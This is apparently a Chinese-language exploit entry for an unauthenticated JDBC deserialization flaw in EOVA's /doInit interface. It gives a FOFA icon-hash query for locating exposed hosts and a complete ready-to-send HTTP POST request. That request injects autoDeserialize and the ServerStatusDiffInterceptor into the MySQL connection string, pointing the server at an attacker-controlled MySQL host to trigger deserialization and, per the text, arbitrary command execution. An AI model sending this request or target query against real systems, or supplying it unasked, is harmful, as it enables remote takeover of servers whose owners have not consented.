# EOVA未授权doInit接口存在反序列化漏洞

EOVA存在JDBC反序列化漏洞，由于JDBC连接mysql服务器的时候，参数完全可控，可传入恶意配置和恶意mysql服务器地址，导致反序列化漏洞。攻击者可利用该漏洞执行任意命令。

## fofa

```yaml
icon_hash="-1699356011"
```

## poc

```javascript
POST /doInit HTTP/1.1  
Host:   
Sec-Fetch-Dest: document  
Cache-Control: max-age=0  
Sec-Fetch-User: ?1  
Sec-Fetch-Site: none  
sec-ch-ua-mobile: ?0  
sec-ch-ua-platform: "Windows"  
Accept-Language: zh-CN,zh;q=0.9  
Sec-Fetch-Mode: navigate  
Cookie: JSESSIONID=1diwaoe2lud2k1w5bzj9gy0r9v; _jfinal_captcha=ec1807bb391d443f9730b7b18384157a  
sec-ch-ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate, br, zstd  
Upgrade-Insecure-Requests: 1  
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1:3333%2Ftest%3FautoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=URLDNS%26Yu9=Yu9%23&port=&username=root&password=123456
```



## 漏洞来源

- https://forum.butian.net/article/560